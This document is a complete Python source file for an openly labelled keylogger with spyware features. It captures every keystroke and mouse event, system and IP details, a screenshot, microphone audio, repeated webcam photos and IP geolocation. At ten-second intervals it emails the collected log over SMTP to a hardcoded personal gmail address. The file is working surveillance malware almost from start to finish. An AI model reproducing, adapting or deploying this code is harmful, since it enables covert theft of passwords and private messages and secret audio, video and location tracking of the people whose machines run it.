import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
import cv2
import geocoder
from pynput import keyboard, mouse
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# ✅ Mailtrap SMTP Credentials
EMAIL_ADDRESS = "Your_UserName"  # Replace with your Mailtrap username
EMAIL_PASSWORD = "Your_Passwor"  # Replace with your Mailtrap password
SMTP_SERVER = "sandbox.smtp.mailtrap.io"
SMTP_PORT = 2525

SEND_REPORT_EVERY = 10  # Report interval in seconds

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log += string + "\n"

    def on_key_press(self, key):
        try:
            self.append_log(f"Key pressed: {key.char}")
        except AttributeError:
            self.append_log(f"Special key pressed: {key}")

    def on_move(self, x, y):
        self.append_log(f"Mouse moved to: {x}, {y}")

    def on_click(self, x, y, button, pressed):
        action = "Pressed" if pressed else "Released"
        self.append_log(f"Mouse {action} at ({x}, {y}) - {button}")

    def on_scroll(self, x, y, dx, dy):
        self.append_log(f"Mouse scrolled at ({x}, {y}) - Direction: {dx}, {dy}")

    def send_mail(self, email, password, message):
        msg = MIMEMultipart()
        msg['From'] = "KeyLogger <no-reply@example.com>"
        msg['To'] = "pdahirrao2004@gmail.com"
        msg['Subject'] = "Keylogger Report"

        msg.attach(MIMEText(message, 'plain'))

        try:
            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.set_debuglevel(1)
                server.starttls()
                server.login(email, password)
                server.sendmail(msg['From'], msg['To'], msg.as_string())
            print("[+] Email Sent Successfully!")
        except Exception as e:
            print(f"[-] Error Sending Email: {e}")

    def report(self):
        self.send_mail(self.email, self.password, self.log)
        self.log = ""  # Reset log after sending
        threading.Timer(self.interval, self.report).start()

    def capture_system_info(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        system_info = f"""
        Hostname: {hostname}
        IP Address: {ip}
        Processor: {platform.processor()}
        System: {platform.system()} {platform.version()}
        Machine: {platform.machine()}
        """
        self.append_log(system_info)

    def capture_screenshot(self):
        try:
            img = pyscreenshot.grab()
            img.save("screenshot.png")
            self.append_log("[+] Screenshot Taken!")
        except Exception as e:
            self.append_log(f"[-] Screenshot Failed: {e}")

    def record_microphone(self):
        try:
            fs = 44100  # Sample rate
            duration = 10  # Seconds
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='int16')
            sd.wait()
            wave_file = wave.open("recorded_audio.wav", 'wb')
            wave_file.setnchannels(2)
            wave_file.setsampwidth(2)
            wave_file.setframerate(fs)
            wave_file.writeframes(recording.tobytes())
            wave_file.close()
            self.append_log("[+] Microphone Audio Recorded!")
        except Exception as e:
            self.append_log(f"[-] Microphone Recording Failed: {e}")

    def capture_webcam_photo(self):
        try:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            if ret:
                cv2.imwrite("webcam_photo.jpg", frame)
                self.append_log("[+] Webcam Photo Captured!")
            cam.release()
        except Exception as e:
            self.append_log(f"[-] Webcam Capture Failed: {e}")
        threading.Timer(self.interval, self.capture_webcam_photo).start()

    def save_location_to_file(self, location):
        """ Save location data to a separate file """
        with open("geo_location_log.txt", "a") as file:
            file.write(location + "\n")

    def get_location(self):
        try:
            g = geocoder.ip('me')
            location_info = f"Location: {g.city}, {g.state}, {g.country}, {g.latlng}"
            self.append_log(location_info)
            self.save_location_to_file(location_info)  # Save location separately
        except Exception as e:
            self.append_log(f"[-] Location Tracking Failed: {e}")
        threading.Timer(self.interval, self.get_location).start()

    def run(self):
        print("[+] Keylogger Running...")

        keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
        mouse_listener = mouse.Listener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll)

        with keyboard_listener, mouse_listener:
            self.report()
            self.capture_webcam_photo()
            self.get_location()
            keyboard_listener.join()
            mouse_listener.join()

# ✅ Start the Keylogger
keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.capture_system_info()
keylogger.capture_screenshot()
keylogger.record_microphone()
keylogger.run()
